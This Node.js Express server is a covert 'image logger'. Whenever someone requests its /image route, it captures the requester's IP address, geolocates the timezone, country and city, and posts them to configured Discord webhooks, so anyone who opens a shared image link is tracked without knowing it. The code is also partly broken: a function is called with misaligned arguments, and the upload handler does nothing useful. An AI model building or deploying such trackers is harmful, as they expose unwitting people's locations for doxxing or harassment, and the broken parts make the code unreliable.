// Importing modules
const express = require('express')
const geoip = require('geoip-lite')
const { v4: uuidv4 } = require('uuid')
const bodyParser = require('body-parser')
const { createCanvas, loadImage } = require('canvas')
const { createLogger, format, transports } = require('winston')
const { WebhookClient, EmbedBuilder, AttachmentBuilder } = require('discord.js')

// Importing config
const config = require('./config.json')

// Creating logger
const logger = createLogger({
  level: 'info',
  format: format.combine(
    format.label({ label: 'Image Logger' }),
    format.timestamp(),
    format.printf(({ level, message, label, timestamp }) => {
      return `${timestamp} [${label}] ${level}: ${message}`
    })
  ),
  transports: [
    new transports.Console(),
    new transports.File({ filename: 'combined.log' })
  ]
})

// Creating canvas
const canvas = createCanvas(1920, 1080)
const ctx = canvas.getContext('2d')

// Set canvas background to transparent
ctx.fillStyle = 'rgba(0, 0, 0, 0)'
ctx.fillRect(0, 0, canvas.width, canvas.height)

// Creating image logger
const imageLogger = (imageData, imageName) => {
  loadImage(imageData)
    .then(image => {
      // Clearing canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height)

      // Set canvas background to transparent
      ctx.fillStyle = 'rgba(0, 0, 0, 0)'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Drawing image
      ctx.drawImage(image, 0, 0, canvas.width, canvas.height)
    })
    .catch(error => {
      logger.error(`Error loading image ${imageName}: ${error}`)
    })
}

// Function to send the image to the webhooks
const sendImageToWebhooks = (imageName, clientIP, timezone, country, city) => {
  timezone = timezone || 'not found'
  country = country || 'not found'
  city = city || 'not found'

  const randomWebhookColor = Math.floor(Math.random() * 16777215).toString(16)

  config.webhooks.forEach(webhook => {
    const webhookClient = new WebhookClient({ url: webhook.url })
    const embed = new EmbedBuilder()
      .setTitle('Someone requested an image')
      .setThumbnail(`attachment://${imageName}`)
      .setFields([
        {
          name: '📡 Network',
          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${timezone}\n🌍 Country: ${country}\n🏙️ City: ${city}\`\`\``
        }
      ])
      .setColor(randomWebhookColor)
      .setTimestamp()

    webhookClient
      .send({
        embeds: [embed]
      })
      .then(() => {
        logger.info(`Image ${imageName} sent to webhook ${webhook.name}`)
      })
      .catch(error => {
        logger.error(
          `Error sending image ${imageName} to webhook ${webhook.name}: ${error}`
        )
      })
  })
}

// Creating express app
const app = express()

// Trusting proxy
app.enable('trust proxy')

// Parsing request bodies
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))

// Serve the image and log the request
app.get('/image', (req, res) => {
  const imageUrl = config.directory
  const imageName = 'image.png' // Specify the desired image name

  // Retrieve the client IP address
  const clientIP =
    req.headers['x-forwarded-for'] || req.connection.remoteAddress

  // Use ipapi to get the client's information
  try {
    const ipInfo = geoip.lookup(clientIP)
    const { timezone, country, city } = ipInfo

    // Log the client's information
    logger.info(
      `Client IP: ${clientIP}, Timezone: ${timezone}, Country: ${country}, City: ${city}`
    )

    // Serve the image
    res.sendFile(
      imageUrl,
      { root: __dirname, headers: { 'Content-Type': 'image/png' } },
      error => {
        if (error) {
          logger.error(`Error sending image: ${error}`)
        } else {
          logger.info(`Image ${imageName} sent to the client`)
        }
      }
    )

    // Send the image to the webhooks
    sendImageToWebhooks(imageUrl, imageName, clientIP, timezone, country, city)
  } catch (error) {
    logger.error(`Error getting client IP information: ${error}`)
  }
})

// Handle the incoming image upload request
app.post('/upload', (req, res) => {
  const imageData = req.body // Assuming the image data is sent in the request body
  const imageName = `${uuidv4()}.png` // Generate a unique image name using UUID

  // Logging image
  imageLogger(imageData, imageName)

  res.status(200).json({ message: 'Image logged successfully' })
})

// Starting the server
const port = process.env.PORT || 3000
app.listen(port, () => {
  console.log(`Server started on port ${port}`)
  logger.info('Image logger started')
})
